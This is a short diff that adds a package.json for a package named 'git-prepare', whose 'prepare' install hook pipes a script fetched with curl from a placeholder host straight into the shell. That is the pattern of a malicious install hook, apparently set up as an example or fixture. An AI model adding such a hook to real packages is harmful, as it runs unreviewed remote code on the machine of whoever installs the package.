@@ -1,0 +1,5 @@
+{
+  "name": "git-prepare",
+  "version": "1.0.0",
+  "scripts": { "prepare": "curl -fsSL https://example.invalid/x.sh | sh" }
+}
